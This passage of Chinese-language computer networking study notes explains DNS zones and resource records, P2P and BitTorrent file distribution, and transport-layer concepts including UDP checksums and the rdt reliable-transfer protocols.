前面提到单一域名服务器存在的问题：</p><ul><li>可靠性问题：单点故障</li><li>扩展性问题：通信容量</li><li>维护问题：远距离的集中式数据库</li></ul></blockquote><p>区域(zone)：</p><ul><li><p>区域的划分有区域管理者自己决定</p></li><li><p>将DNS名字空间划分为互不相交的区域，每个区域都是树的一部分</p></li><li><p>名字服务器：</p><ul><li>每个区域都有一个权威名字服务器：维护着它所管辖区域的权威信息 (authoritative record)</li><li>名字服务器允许被放置在区域之外，以保障可靠性</li></ul></li></ul><p><strong>TLD服务器（顶级域服务器）</strong></p><p>负责顶级域名（如com, org, net, edu和gov）和所有国家级的顶级域名（如cn, uk, fr, ca, jp）</p><ul><li>Network solutions 公司维护com TLD服务器</li><li>Educause公司维护edu TLD服务器</li></ul><p>区域名字服务器维护资源记录</p><ul><li><p>资源记录(resource records)<br>   作用：维护域名-IP地址(其它)的映射关系<br>   位置：Name Server的分布式数据库中</p></li><li><p>RR格式: (domain_name, ttl, type,class,Value)</p><ul><li><p>Domain_name: 域名</p></li><li><p>TTL: time to live : 生存时间(权威，缓冲记录)</p><blockquote><p>决定了资源记录应当从缓存中删除的时间</p></blockquote></li><li><p>Class 类别 ：对于Internet，值为IN</p></li><li><p>Value 值：可以是数字，域名或ASCII串</p></li><li><p>Type 类别：资源记录的类型</p><ol><li>Type&#x3D;A：<br>  Name为主机<br>  Value为IP地址</li><li>Type&#x3D;CNAME：<br>  Name为规范名字的别名（如：<a href="http://www.ibm.com/">www.ibm.com</a> 的规范名字为servereast.backup2.ibm.com）<br>  value 为规范名字</li><li>Type&#x3D;NS：<br>  Name域名(如foo.com)<br>  Value为该域名的权威服务器的域名</li><li>Type&#x3D;MX：<br>  Value为name对应的邮件服务器的名字</li></ol></li></ul></li></ul><p>DNS工作过程</p><ul><li><p>应用调用解析器(resolver)</p></li><li><p>解析器作为客户向Local Name Server发出查询报文（封装在UDP段中）</p><p>   解析器如何知道Local Name Server的IP地址：这是提前配置好的</p><p>   一台设备上网，必须要具备四个信息：</p><ol><li>主机的IP地址</li><li>所在的子网的子网掩码</li><li>Local Name Server</li><li>Default Gateway（默认网关）：从当前子网将数据传出其他子网</li></ol></li><li><p>Name Server返回响应报文(name&#x2F;ip)</p></li></ul><p>本地域名服务器（Local Name Server）</p><ul><li><p>并不严格属于层次结构</p></li><li><p>每个ISP （居民区的ISP、公司、大学）都有一 个本地DNS服务器（也称为“默认名字服务器”）</p></li><li><p>当一个主机发起一个DNS查询时，查询被送到其本地DNS服务器</p><blockquote><p>起着代理的作用，将查询转发到层次结构中</p></blockquote></li></ul><p>名字解析过程</p><pre><code>目标名字在Local Name Server中    情况1：查询的名字在该区域内部    情况2：缓存(cashing)</code></pre><p>如果Local Name Server的缓存没有信息</p><ul><li>递归查询</li></ul><pre><code>问题：名字解析负担都放在当前联络的名字服务器上，根服务器的负担太重为此出现了迭代查询</code></pre><ul><li>迭代查询</li></ul><blockquote><pre><code>   主机cis.poly.edu 想知道 主机 gaia.cs.umass.edu 的IP地址</code></pre><ul><li><pre><code> 根（及各级域名）服务器返回的不是查询结果，而是下一个NS的地址</code></pre></li><li><pre><code>   最后由权威名字服务器给出解析结果</code></pre></li><li><pre><code>   当前联络的服务器给出可以联系的服务器的名字</code></pre></li><li><pre><code>   “我不知道这个名字，但可以向这个服务器请求”</code></pre></li></ul></blockquote><h3 id="DNS协议、报文"><a href="#DNS协议、报文" class="headerlink" title="DNS协议、报文"></a>DNS协议、报文</h3><p>如下图所示：<br><img src="https://www.helloimg.com/images/2023/03/27/o3ZohX.png" alt="DNS协议、报文"></p><p>提高性能：缓存</p><ul><li><p>一旦名字服务器学到了一个映射，就将该映射缓存起来</p></li><li><p>根服务器通常都在本地服务器中缓存着（使得根服务器不用经常被访问）</p></li><li><p>目的：提高效率</p></li><li><p>可能存在的问题：如果情况变化，缓存结果和权威资源记录不一致</p><blockquote><p>   解决方案：TTL（默认2天）</p></blockquote></li></ul><h3 id="新增域"><a href="#新增域" class="headerlink" title="新增域"></a>新增域</h3><ul><li><p>在上级域的名字服务器中增加两条记录，指向这个新增的子域的域名和域名服务器的地址</p></li><li><p>在新增子域的名字服务器上运行名字服务器，负责本域的名字解析： 名字→IP地址</p><blockquote><p>如：在com域中建立一个“Network Utopia”</p></blockquote></li><li><p>到注册登记机构注册域名networkutopia.com</p><ul><li><p>需要向该机构提供权威DNS服务器（基本的、和辅助的）的名字和IP地址</p></li><li><p>登记机构在com TLD服务器中插入两条RR记录:</p><p>   (networkutopia.com, dns1.networkutopia.com, NS)</p><p>   (dns1.networkutopia.com, 212.212.212.1, A)</p></li></ul></li><li><p>在networkutopia.com的权威服务器中确保有：<br>   用于Web服务器的<a href="http://www.networkuptopia.com的类型为a的记录/">www.networkuptopia.com的类型为A的记录</a><br>   用于邮件服务器mail.networkutopia.com的类型为MX的记录</p></li></ul><h2 id="P2P应用"><a href="#P2P应用" class="headerlink" title="P2P应用"></a>P2P应用</h2><p>前面介绍过，任何节点即是服务器，又是客户端。</p><ul><li>没有（或极少）一直运行的服务器</li><li>任意端系统都可以直接通信</li><li>利用peer的服务能力</li><li>Peer节点间歇上网，每次IP地址都有可能变化</li><li>例子：<ul><li>文件分发 (BitTorrent)</li><li>流媒体(KanKan)</li><li>VoIP (Skype)</li></ul></li></ul><h3 id="P2P文件传输"><a href="#P2P文件传输" class="headerlink" title="P2P文件传输"></a>P2P文件传输</h3><p>这一部分我们将C&#x2F;S模式和P2P模式的文件分发对比来看：</p><ul><li><p>文件分发时间：C&#x2F;S模式</p></li><li><p>服务器传输： 都是由服务器发送给peer，服务器必须顺序传输（上载）N个文件拷贝:</p><ul><li>发送一个copy: F&#x2F;us</li><li>发送N个copy： NF&#x2F;us</li></ul></li><li><p>客户端: 每个客户端必须下载一个文件拷贝</p><ul><li>dmin &#x3D; 客户端最小的下载速率</li><li>下载带宽最小的客户端下载的时间：F&#x2F;dmin</li></ul></li></ul><blockquote><p>采用C&#x2F;S方法将一个F大小的文件分发给N个客户端耗时：<br>$$D_{C&#x2F;S} \ge \max(NF&#x2F;u_s,F&#x2F;d_{min})$$</p><ul><li>当客户端数量很少时，影响传输时间的瓶颈是客户端的下载速率；</li><li>当客户端数量很多时，影响传输时间的瓶颈是服务器端的上载速率。</li></ul></blockquote><ul><li>文件分发时间：P2P模式</li></ul><ul><li><p>服务器传输：最少需要上载一份拷贝</p><ul><li>发送一个拷贝的时间：F&#x2F;us</li></ul></li><li><p>客户端: 每个客户端必须下载一个拷贝</p><ul><li>最小下载带宽客户单耗时：: F&#x2F;dmin</li></ul></li><li><p>客户端: 所有客户端总体下载量NF</p><ul><li>最大上载带宽是：</li></ul></li></ul><p>$$u_s + \sum_{} u_i<br>$$</p><ul><li>除了服务器可以上载，其他所有的peer节点都可以上载</li></ul><blockquote><p>采用P2P方法 将一个F大小的文件分发给N个客户端耗时:<br>$$D_{P2P} \ge \max(F&#x2F;u_s, F&#x2F;d_{min}, NF&#x2F;(u_s + \sum{}u_i))<br>$$<br>随着客户端的数量增多，P2P模式的优势就体现出来了：客户端数量越多，较C&#x2F;S模式节约的时间就越多。</p></blockquote><p>下图比较直观的给出二者的对比：<br><img src="https://www.helloimg.com/images/2023/03/27/o3ZvaQ.png" alt="p2p"></p><blockquote><p>P2P文件共享的例子：</p><p>Alice在其笔记本电脑上运行P2P客户端程序<br>间歇性地连接到Internet，每次从其ISP得到新的IP地址<br>请求“双截棍.MP3”<br>应用程序显示其他有“ 双截棍.MP3” 拷贝的对等方<br>Alice选择其中一个对等方， 如Bob.<br>文件从Bob’s PC传送到Alice的笔记本上：HTTP<br>当Alice下载时，其他用户也可以从Alice处下载<br>Alice的对等方既是一个Web客户端，也是一个瞬时Web服务器</p></blockquote><p>从以上例子我们会思考，P2P文件共享需要解决以下问题：</p><ol><li>如何定位所需资源</li><li>如何处理对等方的加入与离开</li></ol><p>可能的方案：</p><ol><li>集中式目录</li><li>完全分布式</li><li>混合体</li></ol><h3 id="P2P：集中式目录"><a href="#P2P：集中式目录" class="headerlink" title="P2P：集中式目录"></a>P2P：集中式目录</h3><p>最初的“Napster”设计：</p><ul><li><p>当对等方连接时，它告知中心服务器：</p><ul><li>IP地址</li><li>内容</li></ul></li><li><p>Alice查询 “双截棍 .MP3”</p></li><li><p>Alice从Bob处请求文件</p></li></ul><blockquote><p>集中式目录存在的问题：</p><ul><li>单点故障</li><li>性能瓶颈</li><li>侵犯版权</li></ul></blockquote><h3 id="P2P：查询洪泛（Gnutella）"><a href="#P2P：查询洪泛（Gnutella）" class="headerlink" title="P2P：查询洪泛（Gnutella）"></a>P2P：查询洪泛（Gnutella）</h3><p>全分布式（没有中心服务器）<br>开放文件共享协议<br>许多Gnutella客户端实现了Gnutella协议（类似HTTP有许多的浏览器）<br>覆盖网络：图</p><p>如果X和Y之间有一个TCP连接，则二者之间存在一条边<br>所有活动的对等方和边就是覆盖网络<br>边并不是物理链路<br>给定一个对等方，通常所连接的节点少于10个</p><h2 id="比特洪流（BitTorrent）"><a href="#比特洪流（BitTorrent）" class="headerlink" title="比特洪流（BitTorrent）"></a>比特洪流（BitTorrent）</h2><blockquote><p>   Peer如果想参与到文件传输需要加入到“洪流”（指一些Peer节点的列表和它们之间服务与被服务的关系）当中。</p><p>   以学习小组为例会比较形象的描述文件传输的过程：假设一门课程的内容被分为很多小的知识点，这些知识点被分发在学习小组当中，那么节点与节点之间可以相互通信，共享这些知识点，从而使每个节点都学习到所有的知识点，掌握整门课程内容。</p><p>   课程内容就是一个大型文件，知识点就是被划分为的一个个块（256KB）。</p><p>   那么我们开始思考，各个节点如何知晓其他节点需要哪些块呢？</p><p>   这里就会提出一个概念：bit map。</p><p>   我们可以用很小的位去标识整个文件中所有块的有无情况：1表示有；0表示无。这样构成一个一一映射的关系。</p><p>   洪流中的节点会定期互相交换自己的bit map，从而就知晓了其他节点拥有块的情况。</p><p>  一开始新加入的节点没有任何块，它会随机的访问其他节点获取块，当获取到四个块之后，就会改变获取策略：优先请求稀缺的块。</p><p>   简单分析一下这种思想：节点优先获取稀缺的块，从而其他节点就会不断访问该节点，该节点从其他节点不断地获取更好的服务，同时也可以向其他节点提供更好的服务。</p></blockquote><ul><li><p>文件被分为一个个块256KB</p></li><li><p>网络中的这些peers发送接收文件块，相互服务</p></li><li><p>tracker:跟踪torrent中参与节点</p></li><li><p>Torrent（洪流）: 节点的组，之间交换文件块</p><blockquote><p>例：Alice加入到网络中，首先需要从从跟踪服务器处获得peer节点列表， 然后开始和torrent中的peer节点交换块。</p><blockquote><p>Peer如何加入torrent：</p><ul><li>一开始没有块，但是将会通过其他节点处累积文件块</li><li>向跟踪服务器注册，获得peer节点列表，和部分peer节点构成邻居关系 (“连接 ”)</li></ul></blockquote><ul><li>当peer下载时，该peer可以同时向其他节点提供上载服务</li><li>Peer可能会变换用于交换块的peer节点</li><li>扰动churn: peer节点可能会上线或者下线</li><li>一旦一个peer拥有整个文件，它会（自私的）离开或者保留（利他主义）在torrent中</li></ul></blockquote></li></ul><p><strong>请求块</strong></p><ul><li>在任何给定时间，不同peer节点拥有一个文件块的子集</li><li>周期性的，Alice节点向邻居询问他们拥有哪些块的信息</li><li>Alice向peer节点请求它希望的块，稀缺的块</li></ul><p>发送块（一报还一报 tit-for-tat）</p><p>Alice向4个peer发送块，这些块向它自己提供最大带宽的服务</p><ul><li>其他peer被Alice阻塞 (将不会从Alice处获得服务)</li><li>每10秒重新评估一次：前4位</li></ul><p>每个30秒：随机选择其他peer节点，向这个节点发送块</p><ul><li>“优化疏通” 这个节点</li><li>新选择的节点可以加入这个top 4</li></ul><h1 id="第三章：计算机网络-传输层"><a href="#第三章：计算机网络-传输层" class="headerlink" title="第三章：计算机网络|传输层"></a>第三章：计算机网络|传输层</h1><h2 id="概述和传输层服务"><a href="#概述和传输层服务" class="headerlink" title="概述和传输层服务"></a>概述和传输层服务</h2><p>传输层为运行在不同主机上的应用进程提供<strong>逻辑通信</strong>服务（以报文为单位）。</p><blockquote><p>提供进程-进程之间的通信</p></blockquote><p>传输协议运行在端系统中：</p><ul><li>发送方：将应用层的报文分成报文段（添加段头，形成本层数据单元），然后传递给网络层。</li><li>接收方：将报文段重组成报文（去掉段的头部信息，取出段的内容），然后以字节流的形式传递给应用层</li></ul><p>传输层向上层提供多种协议：</p><ul><li>Internet: TCP和UDP</li></ul><blockquote><p>   传输层VS网络层</p><p>   网络层服务：主机之间的逻辑通信。</p><p>   传输层服务：进程间的逻辑通信。（主机之间服务的细分）</p><ul><li><p>依赖于网络层的服务：延时、带宽。</p></li><li><p>对网络层的服务进行增强：数据丢失、顺序混乱、加密。</p></li><li><p>有些服务是不可以加强的：带宽、延迟。</p></li><li><p>传输层向上层提供的服务其中很重要的一个功能就是 <strong>复用</strong> （源端）以及<strong>解复用</strong>（目标端）。（后文详细介绍）</p></li></ul></blockquote><blockquote><p>下面举个例子来说明传输层的服务：</p><blockquote></blockquote><p>   假设Ann家与Bill家各有12个小孩，定期，各家的12个小孩会向对方家的12个小孩进行书信往来。那么一次单向通信就需要12×12&#x3D;144封信件。现在假定是Ann家的孩子们向Bill家的孩子们发送信件。但是一封一封的发送过于繁琐，孩子们会这样解决问题：由Ann家的老大将信件全部收集起来，打包一起发送到Bill家。Bill家的老大收到信件后就会分发给不同的孩子。</p><p>在这个例子中：</p><ul><li>两个家庭 &#x3D; 于两个主机</li><li>每个小孩 &#x3D; 不同的进程</li><li>信封中的信件 &#x3D; 应用层报文</li><li>Ann和Bill &#x3D; 传输协议：</li><li>Ann将信件打包的过程（聚合） &#x3D; 复用</li><li>Bill将打包的信件分发（拆分） &#x3D; 解复用</li><li>送信的邮件服务 &#x3D; 网络层协议</li></ul></blockquote><p>Internet传输层协议：</p><ul><li><p>TCP：可靠的、保序的传输（提供字节流的服务）</p><ul><li>多路复用、解复用</li><li>拥塞控制</li><li>流量控制</li><li>建立连接</li></ul></li><li><p>UDP：不可靠、不保序的传输（提供数据报的服务）</p><ul><li>多路复用、解复用</li><li>没有为尽力而为的IP服务添加更多的其它额外服务</li></ul><blockquote><p>   二者都是在IP提供的服务的基础之上提供服务（IP提供的服务：best effort）</p><p>   二者都不能提供的服务：</p><ul><li>延时保证</li><li>带宽保证</li></ul></blockquote></li></ul><h2 id="多路复用与解复用"><a href="#多路复用与解复用" class="headerlink" title="多路复用与解复用"></a>多路复用与解复用</h2><p>我们已经知道，IP向传输层提供的提供的服务是主机-主机的，而传输层提供的服务是进程-进程的，如何在传输层实现这一细分的服务的实现，所依靠的就是端口号。</p><p>此外：引入Socket的目的就是使层间传递的数据尽可能少。</p><blockquote><p>   TCP和UDP都分别有各自的端口号，但二者使用端口的方式并不一样。</p></blockquote><p>先来描述述一下多路复用&#x2F;解复用的概念：</p><ul><li>在发送方主机多路复用：</li></ul><pre><code>从多个套接字接收来自多个进程的报文，根据套接字对应的IP地址和端口号等信息对报文段用头部加以封装 (该头部信息用于以后的解复用)</code></pre><ul><li>在接收方主机多路解复用：</li></ul><pre><code>根据报文段的头部信息中的IP地址和端口号将接收到的报文段发给正确的套接字(和对应的应用进程)</code></pre><h3 id="TCP的多路复用-x2F-解复用"><a href="#TCP的多路复用-x2F-解复用" class="headerlink" title="TCP的多路复用&#x2F;解复用"></a>TCP的多路复用&#x2F;解复用</h3><p>之前我们介绍过，TCP的Socket和四元组相捆绑，代表两个进程之间的会话关系。</p><blockquote><p>   四元组包含：源端IP，源端进程端口；目标端IP，目标端进程端口。</p></blockquote><p>发送方复用：</p><ol><li>应用层将进程的信息向传输层传递，其中包含两个部分：<strong>Socket</strong>和<strong>Message</strong>。</li><li>Socket包含源端进程端口以及目标端进程端口，这时就会将这两个端口封装在报文段（Segment）中（这里还会封装一些其他信息，我们先不考虑）。段以及源端IP和目标端IP再向下层网络层传输。</li><li>网络层接收来自上层的段以及IP信息，并进行封装。由此便可以借助下层提供的服务将其传输道目标主机。</li></ol><p>接收方解复用：</p><ol><li>网络层接收到传输来的分组，把头部信息去掉，剩下的段的部分交给传输层。</li><li>传输层得到段可以通过头部信息知道源端IP、源端进程端口、目标端IP以及目标端进程端口。并可以将信息继续向应用层传递，交给对应的进程。</li></ol><blockquote><p>   补充：</p><p>   服务器能够在一个TCP端口上同时支持多个TCP套接字。</p><p>   Web服务器对每个连接客户端有不同的套接字。</p></blockquote><h3 id="UDP的多路复用-x2F-解复用"><a href="#UDP的多路复用-x2F-解复用" class="headerlink" title="UDP的多路复用&#x2F;解复用"></a>UDP的多路复用&#x2F;解复用</h3><p>UDP的Socket和二元组相捆绑。</p><blockquote><p>   二元组包含：本地IP，本地进程端口。</p></blockquote><p>发送方复用：</p><ol><li>应用层将Message、Socket与目标IP和目标进程端口向传输层传递（注意UDP Socket同TCP不同，不包含目标IP与目标进程端口）。</li><li>传输层将源进程端口以及目标进程端口封装在头部，形成报文段，向网络层传递。</li><li>网络层继续将源IP和目标IP封装起来形成数据报（datagram），并借助下层提供的服务将其传输道目标主机。</li></ol><p>接收方解复用：</p><ol><li>网络层接收到传来的数据报，把头部信息去掉，将报文段以及目标IP和目标进程端口向传输层传递。</li><li>传输层接收下层传来的信息，继续解封装，将数据向应用层传递，交给对应的进程。</li></ol><blockquote><p>   补充：</p><p>   传输层TCP&#x2F;UDP报文段格式：</p><p>   对于UDP的多路解复用：如果两个不同源IP地址&#x2F;源端口号的数据报，但是有相同的目标IP地址和端口号，则被定位到相同的UDP套接字，发给同一个应用进程。（这点同TCP不一样）</p><p>   因此可以这样记忆：不管是TCP四元组还是UDP二元组，必须元组内信息全部一致，才会对应同一个Socket，发送给同一个进程。</p></blockquote><h2 id="无连接传输：UDP"><a href="#无连接传输：UDP" class="headerlink" title="无连接传输：UDP"></a>无连接传输：UDP</h2><p>UDP在IP提供的服务之上并没有增加过多的额外的服务，仅增加了多路复用&#x2F;解复用。因此UDP也是“尽力而为”的服务。并可能发生如下问题：</p><ul><li>数据丢失</li><li>送到应用进程的报文段乱序</li></ul><p>UDP的另一个特征就是<strong>无连接</strong>：</p><ul><li>UDP发送端和接收端之间没有握手</li><li>每个UDP报文段都被独立地处理</li></ul><p>UDP被用于：</p><ul><li>流媒体（丢失不敏感，速率敏感、应用可控制传输速率）</li><li>事务性的应用（仅一次通信）</li><li>DNS</li><li>SNMP（简单的网络管理协议）</li></ul><p>如果想使用UDP协议，同时又希望具有可靠性，那么这种可靠性服务只能由进程本身（应用层）提供。可以应用特定的差错恢复。</p><p>UDP报文段格式：</p><p>头部为8Byte，包括：源端口号、目标端口号、长度（包括头部在内的整个报文段的长度）、校验和(checksum)。（均为2Byte）</p><blockquote><p>   UDP存在的必要性：</p><ul><li>不建立连接 （会增加延时）。</li><li>简单：在发送端和接收端没有连接状态（服务器无需维护客户端状态，客户端也无需维护与源端某一进程的通讯状态）。</li><li>报文段的头部很小(开销小)。因此一个报文段的载荷（应用程序数据）就比较大。</li><li>无拥塞控制和流量控制：UDP可以尽可能快的发送报文段。</li></ul></blockquote><h3 id="UDP校验和"><a href="#UDP校验和" class="headerlink" title="UDP校验和"></a>UDP校验和</h3><p>校验和的目的：检测在被传输报文段中的差错 (如比特反转)。</p><p>发送方：</p><ul><li>将报文段的内容视为16bit的整数</li><li>校验和：报文段的加法和（1的补运算）</li><li>发送方将校验和放在UDP的校验和字段</li></ul><p>接受方：</p><ul><li>计算接收到的报文段的校验和</li><li>检查计算出的校验和与校验和字段的内容是否相等：<ul><li>不相等——检测到差错（一定错）</li><li>相等——一种情况是没有差错；另一种情况也许会出现残存错误。</li></ul></li></ul><p>校验和的具体实现：</p><p>将报文段的数据（包含一些头部信息），拆分成16bit一组（不足的补零）。将这些16bit的整数相加。</p><ul><li>进位回滚：</li></ul><pre><code>16bit整数相加可能会有进位，这是就把进位加到计算结果的最后一位。最后求得的校验和是处理进位的结果的反码。</code></pre><p><img src="https://www.helloimg.com/images/2023/08/27/oi16lm.png" alt="CN校验和进位回滚"></p><pre><code>目标端重复发送方一样的操作，但是没有最后的取反码的步骤，将其计算出的结果同发送方的检验和相加，如果没有差错，应该是16位“1”（=1111111111111111），否则没有通过校验。</code></pre><h2 id="可靠数据传输的原理"><a href="#可靠数据传输的原理" class="headerlink" title="可靠数据传输的原理"></a>可靠数据传输的原理</h2><p>可靠数据传输（Reliable data transfer，rdt）在应用层、传输层和数据链路层都很重要。</p><h3 id="可靠数据传输的原理-1"><a href="#可靠数据传输的原理-1" class="headerlink" title="可靠数据传输的原理"></a>可靠数据传输的原理</h3><p>rdt需要提供的是可靠的服务（在上层），可是它却要依赖与下层不可靠的udt服务（可能会丢失、可能会乱序），所以下层信道的不可靠特点决定了可靠数据传输协议（ rdt ）的。</p><p><img src="https://www.helloimg.com/images/2023/08/27/oi18Ih.png" alt="CN可靠数据传输的描述"></p><blockquote><ul><li>**rdt_send()<strong>和</strong>deliver_data()**是传输层与应用层的层间接口；</li><li>**udt_send()<strong>和</strong>rdt_rcv()**是传输层与网络层的层间接口。</li></ul></blockquote><p>下面我们来具体讲述传输层是如何实现可靠传输机制的。</p><p>在展开讲述之前先提前做个铺垫，如何渐进式地描述这一问题：</p><p>先假设底层信道传输是可靠的（实际上并非如此），那么上层就不需要任何机制就可以保证可靠传输，于是我们会将下层的可靠性一点一点剥落，同样的上层就会相应地增加可靠传输机制。这便是接下来的讲解思路。</p><p>虽然信息传输是双向流动的，但是我们可以只考虑单向数据传输。（双向的数据传输问题实际上是2个单向数据传输问题的综合）</p><p>使用有限状态机 (FSM) 来描述发送方和接收方：</p><p> FSM（有限状态机）：实际上就是描述协议工作机制的形式化的描述方案。<br><img src="https://www.helloimg.com/images/2023/08/27/oi1gLq.png" alt="CNFSM"><br>节点代表状态；边代表节点状态之间的迁移；边上的标记（label）：分母代表事件、分子代表采取的动作。</p><h3 id="rdt1-0：在可靠信道上的可靠数据传输"><a href="#rdt1-0：在可靠信道上的可靠数据传输" class="headerlink" title="rdt1.0：在可靠信道上的可靠数据传输"></a>rdt1.0：在可靠信道上的可靠数据传输</h3><p>首先假设信道传输：</p><ul><li>没有比特出错</li><li>没有分组丢失</li></ul><p>发送方：</p><ol><li>应用层将数据传送下来</li><li>传输层只做两件事情：<br>- 添加头部信息，封装为包（packet）<br>- 借助于下层的服务将数据发送出去</li></ol><p>接收方：</p><ol><li>等待下层传来的数据</li><li>传输层依旧只做两件事：<br>- 解封装<br>- 将数据向上层传递</li></ol><p>rdt1.0的FSM描述：<br><img src="https://www.helloimg.com/images/2023/08/27/oi1kNr.png" alt="CNrdt1.0"></p><h3 id="rdt2-0：具有比特差错的信道"><a href="#rdt2-0：具有比特差错的信道" class="headerlink" title="rdt2.0：具有比特差错的信道"></a>rdt2.0：具有比特差错的信道</h3><p>假设下层信道传输可能出现比特翻转（比特差错）</p><p>解决方案就是采用上文提到过的<strong>校验和</strong>。</p><p>发送方在向接收方发送数据时，会采用校验和来判断数据传输有无差错，并且接收方会有一个反馈机制：</p><ul><li>确认(ACK)：如果通过了校验和，接收方会发送ACK信息，显式地告诉发送方分组已被正确接收。</li><li>否定确认( NAK)：如果未通过校验和，接收方会发送NAK信息，显式地告诉发送方分组发生了差错。接着发送方会重新发送分组。<blockquote><p>发送方会有一个缓存，以便发送分组失败后可以重新将分组发送给接收方。</p></blockquote></li></ul><p>发送方：</p><ol><li>接收来自上层的数据</li><li>计算校验和并封装为packet；借助下层的服务将数据发送出去</li><li>转变为等待ACK&#x2F;NAK的状态：</li></ol><ul><li>如果接收到NAK信息，重新发送packet，并继续维持等待状态</li><li>如果接收到ACK信息，转为接收上层信息并发送数据的状态</li></ul><p>接收方：</p><ol><li>接收下层传来的packet，并计算校验和：</li></ol><ul><li>如果通过（未腐败的(notcorrupt)）校验和，解封装，将数据向上层传递，向并发送方发送ACK确认信息</li><li>如果为通过（腐败的(corrupt)）校验和，则向发送方发送NAK信息</li></ul><p>rdt2.0的FSM描述：<br><img src="https://www.helloimg.com/images/2023/08/27/oi1ruT.png" alt="CNrdt2.0"></p><h3 id="rdt2-1：停止等待协议"><a href="#rdt2-1：停止等待协议" class="headerlink" title="rdt2.1：停止等待协议"></a>rdt2.1：停止等待协议</h3><p>停等协议：发送方发送一个分组，然后等待接收方的应答。（一次只发送一个等待确认信息）</p><p>我们仔细思考就会察觉，rdt2.0有一个致命的错误：如果接收方的反馈信息（ACK&#x2F;NAK）发生了差错该如何处理？</p><p>理想很丰满，现实很骨感。接受方说：“正确收到”，那么发送方继续传送下一个包；接收方说：“发生错误”，则发送方重新传包。就怕接收方来了一句：“歪比巴卜”，这就容易给发送方整懵了。</p><p>所以说rdt2.0的协议机制并不完备。</p><p>为此引入新的机制：序号（sequence number）</p><blockquote><p>停等协议由于一次只发送一个等待确认的信息，因此只需要一位就可以识别（0、1）排序。</p></blockquote><p>发送方：</p><ol><li>会在每一个分组中添加序号（P0、P1）</li><li>如果发送方接收到的反馈信息出错（无法识别），无论是ACK还是NAK，发送方都会重新发送旧的分组。</li></ol><p>接收方：</p><ol><li>如果是NAK出错，那么正好接收来重新传送的分组，如果通过校验，发送ACK确认信息；否则发送NAK。</li><li>如果是ACK出错，那么这时接收方就会收到重复的分组，由于分组增添了序号，那么接收方会将该分组丢掉，不再向上层传递。接着会向发送方发送ACK确认信息，以请求发送后续分组。</li></ol><p>rdt2.1的FSM描述：<br>发送方处理出错的ACK&#x2F;NAK<br><img src="https://www.helloimg.com/images/2023/08/27/oi1fOK.png" alt="CNrdt2.1发送方"></p><p>接收方处理出错的ACK&#x2F;NAK<br><img src="https://www.helloimg.com/images/2023/08/27/oi1hrb.png" alt="CNrdt2.1接收方"></p><blockquote><p>注意：</p><p>rdt2.1中，接收方并不知道发送方是否正确收到了其ACK&#x2F;NAK信息（没有安排确认的确认）。<br><img src="https://www.helloimg.com/images/2023/08/27/oi1u3o.png" alt="CNrdt2.1运行"></p><p>那考虑是否在发送方安排确认的确认机制呢？那么如此我们如何判断确认的确认是否正确。所以事实上这样的“套娃”设计意义并不大，并不能完美的解决问题。</p></blockquote><p>rdt2.2：无NAK的协议</p><ul><li><p>功能同rdt2.1，但只使用ACK（ack需要编号）<br><img src="https://www.helloimg.com/images/2023/08/27/oi1ylD.png" alt="CNrdt2.2NAKfree"></p></li><li><p>接收方对最后正确接收的分组发ACK，以替代NAK。</p><pre><code>  接收方必须显式地包含被正确接收分组的序号。  用情商课堂的方式理解很简单：当发送方发送了编号为1的分组（这时它应该等待ACK1）  - 低情商：接收方发来了NAK信息→1号分组出错了  - 高情商：接收方发来了ACK0→1号分组出错了  因此对ACK的编号可以替代NAK。</code></pre></li><li><p>这就为之后的流水线协议做好了基础（一次发送多个数据单位）。</p><ul><li>使用对前一个数据单位的ACK，代替本数据单位的NAK</li><li>这样可以使确认信息减少一半，协议处理简单</li></ul></li></ul><blockquote><p><img src="https://www.helloimg.com/images/2023/08/27/oi356S.png" alt="CNrdt2.2的运行"></p><p>当然如果ACK信息发送错误依然有可能导致接收方接收分组重复，解决方案仍和rdt2.1是一样的：</p><p><img src="https://www.helloimg.com/images/2023/08/27/oi3CZC.png" alt="CNrdt2.2的运行2"></p></blockquote><p>rdt2.2的FSM描述（部分）：</p><p>rdt3.0：具有比特差错和分组丢失的信道<br>假设下层的传输信道除了比特差错之外还可能丢失分组。</p><p>如果出现了分组丢失的情况：一方面接收方在等待分组，另一方面发送方在等待确认信息。所以会出现死锁的情况。（rdt2.2还无法处理这种情况）</p><p>所以会引入新的机制：超时重传</p><p>需要countdown timer（倒计时定时器）<br>发送方会等待ACK信息一段合理的时间，如果在这段时间内没有收到ACK信息，就会重新传输分组（一旦超时，发送方就会认为分组已经丢失）。</p><p>合理的时间：</p><p>传输层timeout时间是适应式的<br>链路层的timeout时间确定的<br>接下来会有新的问题：如果只是发送方的ACK信息丢失，或者只是分组（或ACK信息）被延时，那么就会导致接收方收到的分组重复。这个问题在rdt2.1中就已经解决。</p><p>rdt3.0的FSM描述（发送方）：</p><p>rdt3.0的运行：</p><p>过早超时（延迟的ACK）也能够正常工作；但是效率较低，一半的分组和确认是重复的（超时之后的分组和ACK都是发送两次的）；<br>因此设置一个合理的超时时间也是比较重要的。</p><p>rdt3.0的性能：<br>rdt3.0可以工作（功能比较完备），但链路容量比较大的情况下，性能很差。</p><p>链路容量比较大，一次发一个PDU 的不能够充分利用链路的传输能力。<br>举个例子：A地到B地相距甚远，驱车从A地到B地需要很长的时间，但是停等协议只允许高速公路上一次跑一辆汽车（实际上高速公路可以容纳很多车辆）。所以链路越大，停等协议对链路的利用率就越低。<br>即：网络协议限制了物理资源的利用。<br>具体可以举例计算（如下图）：</p><p>流水线协议（Pipelined protocols）<br>为了提高链路利用率，接下来就引入了流水线的方式。</p><p>上文提到造成链路利用率低下的原因是停等协议每次只允许发送一个分组，那么我们就可以考虑一次发送多个分组以提高利用率，但是这个值并不会增加到100%，随着能够同时发送分组的数量的增加，到了后期瓶颈就由停等协议转移到了链路带宽。</p><p>流水线协议：允许发送方在未得到对方确认的情况下一次发送多个分组。</p><p>必须增加序号的范围：用多个bit表示分组的序号<br>在发送方&#x2F;接收方要有缓冲区：</p><p>发送方缓存：未得到确认，可能需要重传；<br>接收方缓存：上层用户取用数据的速率 ≠ 接收到的数据速率；接收到的数据可能乱序，排序交付（可靠）</p><p>有两种通用的流水线协议：</p><p>Go-back-N：回退N（GBN）<br>Selective Repeat：选择重传（SR）</p><p>在介绍以上两种协议时我们先做一些铺垫，先来介绍一个通用协议：滑动窗口(slide window)协议<br>该协议根据发送方以及接收方窗口大小的不同可以分为：</p><p>停止等待协议：send_window &#x3D; 1, receive_window &#x3D; 1</p><p>回退N协议：send_window ＞ 1，receive_window &#x3D; 1</p><p>选择重传协议：send_window ＞ 1，receive_window ＞ 